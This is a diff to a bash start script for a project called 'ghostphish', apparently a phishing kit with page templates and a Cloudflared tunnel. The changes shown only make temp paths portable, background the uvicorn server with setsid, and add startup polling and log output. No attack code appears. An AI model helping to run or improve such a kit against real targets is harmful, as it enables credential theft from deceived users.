@@ -31,8 +31,12 @@ link() {
 PORT=8000
 VERSION="1.0.0"
 SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
-LOG_FILE="/tmp/ghostphish_tunnel.log"
-PID_FILE="/tmp/ghostphish_tunnel.pid"
+# Portable temp path — Termux's $TMPDIR is $PREFIX/tmp, Linux is /tmp
+TMP="${TMPDIR:-/tmp}"
+LOG_FILE="$TMP/ghostphish_tunnel.log"
+PID_FILE="$TMP/ghostphish_tunnel.pid"
+UVICORN_LOG="$TMP/ghostphish_uvicorn.log"
+UVICORN_PID="$TMP/ghostphish_uvicorn.pid"
 WIDTH=64
 
 # ─── Templates: slug|Name|description ─────────────
@@ -150,20 +154,43 @@ start_container() {
 
         mkdir -p "$SCRIPT_DIR/data"
         pkill -f "uvicorn app:app" 2>/dev/null; sleep 1
-        (cd "$SCRIPT_DIR" && GHOSTPHISH_DATA="$SCRIPT_DIR/data" \
-            nohup python3 -m uvicorn app:app --host 0.0.0.0 --port "$PORT" \
-            > /tmp/ghostphish_uvicorn.log 2>&1 & disown) 2>/dev/null
+        : > "$UVICORN_LOG"
+
+        # Direct background launch (works reliably on Termux + Linux).
+        # setsid detaches from the controlling terminal so it survives ./start.sh exit.
+        cd "$SCRIPT_DIR" || exit 1
+        if command -v setsid >/dev/null 2>&1; then
+            GHOSTPHISH_DATA="$SCRIPT_DIR/data" \
+                setsid python3 -m uvicorn app:app --host 0.0.0.0 --port "$PORT" \
+                </dev/null >"$UVICORN_LOG" 2>&1 &
+        else
+            GHOSTPHISH_DATA="$SCRIPT_DIR/data" \
+                nohup python3 -m uvicorn app:app --host 0.0.0.0 --port "$PORT" \
+                </dev/null >"$UVICORN_LOG" 2>&1 &
+        fi
+        echo $! > "$UVICORN_PID"
+        disown 2>/dev/null || true
     fi
 
-    sleep 4
-    if is_running; then
-        msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N} ${D}(runtime: ${RUNTIME})${N}"
+    # Poll up to 20s — Termux/phones are slower to boot uvicorn than a laptop.
+    for i in 1 2 3 4 5 6 7 8 9 10; do
+        if is_running; then
+            msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N} ${D}(runtime: ${RUNTIME})${N}"
+            return 0
+        fi
+        sleep 2
+    done
+
+    msg_err "server failed to start after 20s"
+    if [ "$RUNTIME" = "docker" ]; then
+        msg_info "check: docker logs ghostphish"
     else
-        msg_err "server failed to start"
-        [ "$RUNTIME" = "docker" ] && msg_info "check: docker logs ghostphish"
-        [ "$RUNTIME" = "python" ] && msg_info "check: tail /tmp/ghostphish_uvicorn.log"
-        exit 1
+        msg_info "check: tail $UVICORN_LOG"
+        echo ""
+        echo "── last 15 lines of uvicorn log ──"
+        tail -15 "$UVICORN_LOG" 2>/dev/null | sed 's/^/  /'
     fi
+    exit 1
 }
 
 # ─── Cloudflared tunnel ───────────────────────────
